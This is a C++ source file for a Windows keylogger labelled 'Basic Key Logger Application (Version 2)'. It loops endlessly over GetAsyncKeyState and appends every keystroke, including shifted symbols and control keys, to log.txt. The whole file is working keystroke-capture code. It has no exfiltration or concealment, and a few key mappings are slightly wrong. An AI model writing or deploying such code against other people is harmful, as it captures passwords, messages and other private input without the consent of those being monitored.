#include <iostream>
#include <fstream>
#include <conio.h>
#include <cctype>
#include <Windows.h>

/* --------------------- Basic Key Logger Application (Version 2) --------------------- */


using namespace std;

static unsigned char previousKey;

void logAlphabetKeys(unsigned char currentKey);

void logNumSymbols(unsigned char currentKey);

bool logControlCharacters(unsigned char currentKey);

void logOtherSymbols(unsigned char currentKey);

void saveToFile(unsigned char currentKey);



int main()
{
    ofstream log("log.txt", ios_base::out);

    while (true) {

        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767)
                saveToFile(i);
        }
    }
    
    return 0;
}

void logAlphabetKeys(unsigned char currentKey) {

    ofstream log("log.txt", ios_base::app);

    if (previousKey == VK_SHIFT)
        log << currentKey;
    else
        log << (char)tolower(currentKey);
}

void logNumSymbols(unsigned char currentKey) {

    ofstream log("log.txt", ios_base::app);

    switch (currentKey)
    {
    case 48:
        log << ")";
        break;
    case 49:
        log << "!";
        break;
    case 50:
        log << "@";
        break;
    case 51:
        log << "#";
        break;
    case 52:
        log << "$";
        break;
    case 53:
        log << "%";
        break;
    case 54:
        log << "^";
        break;
    case 55:
        log << "&";
        break;
    case 56:
        log << "*";
        break;
    case 57:
        log << "(";
        break;
    default:
        break;
    }
}

bool logControlCharacters(unsigned char currentKey) {

    ofstream log("log.txt", ios_base::app);

    switch (currentKey)
    {
    case VK_BACK:
        log << "VK_BACK";
        return true;
    case VK_TAB:
        log << "VK_TAB";
        return true;
    case VK_RETURN:
        log << "VK_ENTER";
        return true;
    case VK_SHIFT:
        log << "VK_SHIFT";
        return true;
    case VK_CONTROL:
        log << "VK_CONTROL";
        return true;
    case VK_MENU:
        log << "VK_ALT";
        return true;
    default:
        return false;
    }
}

void logOtherSymbols(unsigned char currentKey) {

    ofstream log("log.txt", ios_base::app);
    
    if (previousKey == VK_SHIFT)
    {
        switch (currentKey)
        {
        case VK_OEM_1:
            log << ":";
            break;
        case VK_OEM_2:
            log << "?";
            break;
        case VK_OEM_3:
            log << "~";
            break;
        case VK_OEM_4:
            log << "{";
            break;
        case VK_OEM_5:
            log << "|";
            break;
        case VK_OEM_6:
            log << "}";
            break;
        case VK_OEM_7:
            log << "'";
            break;
        case VK_OEM_COMMA:
            log << "<";
            break;
        case VK_OEM_PERIOD:
            log << ".";
            break;
        case VK_OEM_MINUS:
            log << "_";
            break;
        case VK_OEM_PLUS:
            log << "+";
            break;
        default:
            break;
        }
    }
    else
        log<<currentKey;

}

void saveToFile(unsigned char currentKey) {

    ofstream log("log.txt", ios_base::app);

    if ((currentKey >= 65) && (currentKey <= 90))//A-Z
        logAlphabetKeys(currentKey);

    else if ((currentKey >= 48) && (currentKey <= 57))
    {
        if (previousKey == VK_SHIFT)
            logNumSymbols(currentKey);
        else
            log << currentKey;
    }

    else if (logControlCharacters(currentKey)) {
        previousKey = currentKey;
        return;
    }

    else
        logOtherSymbols(currentKey);

    previousKey = currentKey;

}